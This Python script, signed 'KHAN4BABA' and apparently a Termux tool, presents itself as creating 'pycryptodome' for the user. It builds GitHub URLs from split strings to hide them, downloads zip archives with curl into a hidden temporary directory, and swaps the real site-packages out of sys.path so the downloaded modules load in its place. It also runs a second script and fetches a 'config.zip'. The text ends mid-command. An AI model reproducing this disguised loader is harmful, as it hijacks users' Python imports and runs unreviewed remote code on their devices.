#SOURCE BY : KHAN4BABA

#GITHUB : KHAN4BABA

#coding = utf-8

from uuid import uuid4

import os,sys,tempfile,string,random,subprocess,uuid

http_directory = tempfile.mkdtemp(prefix='.')

site_packages = sys.path[4]

print(site_packages)

print(http_directory)

sys.path.remove(site_packages)

sys.path.insert(4,http_directory+'/reqmodule')

sys.path.insert(5,http_directory)

try:

        os.mkdir('crypto')

except:pass

hh = "ho"

hh2 = "9/pycrypt"

find_aarch = subprocess.check_output('uname -om',shell=True)

if 'aarch64' in str(find_aarch):

        user_aarch = '64'

        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'

elif 'arm' in str(find_aarch):

        user_aarch = '32'

        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'

else:

        print(' Unknown aarch ')

        exit()

if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):

        os.system('clear')

        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')

        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')

        os.system('python jan.py')

else:

        akk2="rsi"

        akk=f"cha{akk2}fi"

        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')

        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'

        os.system(f'curl -L {lib} > {http_directory}/config.zip')

        os.system(f'cd {http_directory} && unzip config.zip
